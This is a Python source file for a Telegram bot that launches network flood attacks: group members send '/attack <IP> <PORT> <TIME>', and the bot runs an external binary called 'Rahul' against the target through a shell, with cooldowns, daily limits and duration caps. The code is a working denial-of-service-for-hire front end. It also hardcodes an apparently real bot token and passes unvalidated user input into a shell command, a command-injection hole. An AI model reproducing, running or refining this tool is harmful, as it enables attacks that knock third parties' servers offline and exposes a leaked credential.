#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading

# Your Telegram bot token
bot = telebot.TeleBot('7330439352:AAGe4akhUf57yi6wNDRCl44IRoot4ehq3cc')

# Group details
GROUP_ID = "-1002399798592"  # Your group's Telegram ID
GROUP_INVITE_LINK = "https://t.me/+ZPo210hJV2YwZDhl"  # Your group's invite link

# Attack limits
COOLDOWN_TIME = 80  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
MAX_ATTACK_TIME = 180  # Max attack duration

# 🎯 Random Image URLs  
image_urls = [
     "https://envs.sh/Err.0.jpg",
     "https://envs.sh/Er9.jpg",
     "https://envs.sh/ErN.jpg",
     "https://envs.sh/Er6.webp",
     "https://envs.sh/Erm.webp",
     "https://envs.sh/Erf.jpg",
     "https://envs.sh/Erf.jpg",
     "https://envs.sh/ErN.jpg",
     "https://envs.sh/Er9.jpg",
     "https://envs.sh/Err.0.jpg"
     
]

# Function to check if a user is in the group
def is_user_in_group(user_id):
    try:
        member = bot.get_chat_member(GROUP_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

# Function to check if the command is sent in the group only
def is_message_from_group(message):
    return str(message.chat.id) == GROUP_ID  # Check if message is from the group

# Function to restrict bot usage to group members & only inside the group
def restricted_access(func):
    def wrapper(message):
        user_id = str(message.from_user.id)
        
        # ❌ **Check if the user is in the group**
        if not is_user_in_group(user_id):
            bot.reply_to(message, f"🚨 **Join our group first!**\n🔗 [Click Here to Join]({GROUP_INVITE_LINK})", parse_mode="Markdown")
            return
        
        # ❌ **Check if the command is sent inside the group only**
        if not is_message_from_group(message):
            bot.reply_to(message, "❌ **You can use this command only in the group!**")
            return
        
        return func(message)
    return wrapper

@bot.message_handler(commands=['attack'])
@restricted_access
def handle_attack(message):
    command = message.text.split()
    
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"❌ Maximum attack time is {MAX_ATTACK_TIME} seconds.")
            return
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    full_command = f"./Rahul {target} {port} {time_duration} 900"

    # Attack Start Notification
    random_image = random.choice(image_urls)
    bot.send_photo(message.chat.id, random_image,
                   caption=f"🚀 Attack started on `{target}:{port}`\n⏳ Time: {time_duration}s")

    try:
        subprocess.run(full_command, shell=True, check=True)
        bot.send_message(message.chat.id, f"✅ Attack Finished on `{target}:{port}` for {time_duration}s.")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error executing attack command: {e}")

@bot.message_handler(commands=['start'])
@restricted_access
def welcome_start(message):
    bot.reply_to(message, f"🚀 **Welcome!**\nJoin our group first to use this bot:\n🔗 [Join Here]({GROUP_INVITE_LINK})", parse_mode="Markdown")

# Start polling
bot.polling(none_stop=True)